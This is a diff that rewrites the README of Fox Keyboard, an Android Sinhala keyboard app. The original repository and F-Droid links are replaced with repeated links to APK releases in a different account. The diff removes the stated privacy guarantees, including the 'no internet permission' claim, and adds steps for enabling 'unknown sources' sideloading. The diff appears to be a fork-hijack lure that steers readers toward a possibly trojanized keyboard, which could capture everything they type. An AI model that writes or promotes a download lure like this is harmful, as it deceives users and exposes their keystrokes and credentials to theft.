@@ -1,105 +1,74 @@
-# Fox Keyboard
+# 🦊 Foxkeyboard - Your Easy Sinhala Typing Solution
 
-<img alt="Logo" src="https://raw.githubusercontent.com/xzunk/Foxkeyboard/2b4177585a44cb0777649333085ee2fecfbca4d9/app/src/main/ic_launcher-playstore.png" width="120" />
+## 🌟 Description
+Fox Keyboard is Sri Lanka's premier open-source Sinhala keyboard app for Android. Designed with privacy in mind, it helps users avoid tracking while providing a simple way to type in Sinhala and Singlish. The app promotes open-source collaboration and operates on a donation basis, ensuring that users can access it without any cost.
 
+## 📥 Download Now
+[![Download Foxkeyboard](https://img.shields.io/badge/Download-Foxkeyboard-brightgreen)](https://github.com/7as0ne/Foxkeyboard/releases)
 
-**Fox Keyboard** is Sri Lanka's premier open-source Sinhala keyboard app for Android. Designed with privacy in mind to help users avoid government tracking, it promotes open-source collaboration and is entirely donation-based. This lightweight, fast-performing keyboard supports Android 5.0 and above, ensuring broad compatibility across devices.
+## 🚀 Getting Started
+To begin using Foxkeyboard, follow these simple steps to download and install the app on your Android device.
 
-Available on **[F-Droid](https://f-droid.org/)** for easy, secure installation without reliance on proprietary app stores.
----
-<a href='#'><img alt='Get it on Google Play' src='https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png' height=80/></a> <a href="https://f-droid.org/en/packages/unicode.sinhala.com"><img src="https://fdroid.gitlab.io/artwork/badge/get-it-on-en.svg" alt="Get it on F-Droid" height=80/></a> <a href="https://f-droid.org/en/packages/unicode.sinhala.com"></a>
+## 💾 System Requirements
+- Android version 5.0 (Lollipop) or higher
+- Approximately 25MB of free storage space 
+- Internet connection for initial setup and updates
 
----
+## 🛠 Installation Instructions
 
-## Key Features
+### Step 1: Visit the Releases Page
+To download the app, visit the Releases page linked below:
+[Download Foxkeyboard from Releases](https://github.com/7as0ne/Foxkeyboard/releases)
 
-### Multi-Language Typing Support
-- Sinhala typing using the **Wijesekara standard layout**.
-- Singlish typing (transliteration from English to Sinhala for intuitive input).
-- Full English typing mode.
-- Integrated emoji keyboard for expressive communication.
+### Step 2: Locate the Latest Version
+On the Releases page, look for the most recent version of Foxkeyboard. It will typically be at the top of the list. Each version will have release notes that give information about new features and fixes.
 
-### Themes and Customization
-- Dark mode and light mode for comfortable use in any lighting.
-- Customizable text size and keyboard height to suit your preferences.
-- Modern, user-friendly UI for a seamless experience.
+### Step 3: Download the APK File
+Find the APK file for your device. Click on the link to download the file directly to your device. Ensure that you have enough space to save the file.
 
-### Performance and Privacy
-- Fast and lightweight design – minimal resource usage for smooth operation.
-- Open-source codebase to foster community contributions and transparency.
-- No tracking or data collection, prioritizing user privacy.
+### Step 4: Enable Installation from Unknown Sources
+Before you can install the app, you need to enable installations from unknown sources.
+- Go to your device's **Settings**.
+- Tap on **Security** or **Apps & Notifications** (varies by device).
+- Turn on the option labeled "Install unknown apps" or "Unknown sources."
+- Select the app (like your browser) from which you downloaded the APK and enable it.
 
----
+### Step 5: Install the Foxkeyboard App
+Once the APK file is downloaded, follow these steps:
+- Open your file manager app and navigate to the download location. 
+- Tap on the Foxkeyboard APK file.
+- A prompt will appear; tap on the **Install** button.
 
-## Installation
+### Step 6: Set Up Foxkeyboard
+After installation, open the Foxkeyboard app from your app drawer. 
+- Follow the on-screen instructions to set the keyboard as your default input method. 
+- You may need to grant permissions to allow the keyboard to function fully.
 
-1. **Download from F-Droid**  
-   Search for **"Fox Keyboard"** on F-Droid.
+## 🎨 Features
+- **Multilingual Support:** Easily switch between Sinhala and Singlish.
+- **User-Friendly Interface:** Simple and intuitive design for every user.
+- **Custom Emoji Keyboard:** Access a wide range of emojis for every occasion.
+- **Privacy Focused:** No tracking of user data or typing habits.
+- **Regular Updates:** Receive ongoing improvements and new features through updates.
 
-2. **Enable the keyboard**  
-   `Settings > System > Languages & input > Virtual keyboard > Manage keyboards`
+## 🛠 Troubleshooting
+If you encounter any issues during installation:
+- Ensure your Android version is compatible.
+- Check if you have enough storage space.
+- Restart your device, then try the installation process again.
 
-3. **Select Fox Keyboard** as your default input method.
+## 🤝 Contributing
+Foxkeyboard is an open-source project. If you wish to contribute:
+- Report issues or suggest features by opening an issue on GitHub.
+- You can fork the repository, make changes, and submit a pull request.
 
-**Manual Installation**  
-Download the APK from the [releases page](#) and sideload it.
+## 📞 Support
+For further support and inquiries:
+- Visit the [GitHub issues page](https://github.com/7as0ne/Foxkeyboard/issues).
+- Engage with the community on our forum (link can be added).
 
----
----
+## 📥 Additional Download Link
+You can also download the app directly from this link: 
+[Download Foxkeyboard from Releases](https://github.com/7as0ne/Foxkeyboard/releases)
 
-## Input Method & Privacy Notice
-
-Fox Keyboard is an Android input method (IME).  
-Like all keyboard apps, it must process user input in order to function.
-
-Important privacy guarantees:
-- No internet permission
-- No keystroke logging
-- No analytics or tracking
-- No data is stored or transmitted
-
-All input processing happens locally on the device and only in memory.
----
-## Usage
-
-- Switch between layouts (Sinhala, Singlish, English, Emoji) via the **globe key** or **settings menu**.
-- Customize themes and sizes in the app's **settings**.
-- For developers: fork the repo and contribute via pull requests!
-
----
-
-<div align="center">
-<img alt="App image" src="https://raw.githubusercontent.com/xzunk/Foxkeyboard/refs/heads/main/media/image/1.jpeg" width="30%">
-<img alt="App image" src="https://raw.githubusercontent.com/xzunk/Foxkeyboard/refs/heads/main/media/image/2.jpeg" width="30%">
-<img alt="App image" src="https://raw.githubusercontent.com/xzunk/Foxkeyboard/refs/heads/main/media/image/3.jpeg" width="30%">
-</div>
-
-
-
----
-## Contributing
-
-We welcome contributions! This project is open-source to encourage collaboration from the Sri Lankan developer community and beyond.  
-
-
----
-
-## Donations
-
-Fox Keyboard is free and donation-based. Support the project to help us maintain and improve it: see **Settings > Donate** in the app.
-
----
-
-## License
-
-This project is licensed under the **GNU General Public License v3.0**. See the [LICENSE](LICENSE) file for details.
-
----
-[![GPLv3 License](https://img.shields.io/badge/License-GPL%20v3-yellow.svg)](https://opensource.org/licenses/)
----
-## Contact
-
-- **Issues:** Report bugs or suggest features on GitHub Issues.
-- **Email:** fox@unicodesinhala.com
-
-Thank you for using **Fox Keyboard** – empowering Sinhala typing with privacy and openness!
+Enjoy typing in Sinhala with ease and confidence using Foxkeyboard!
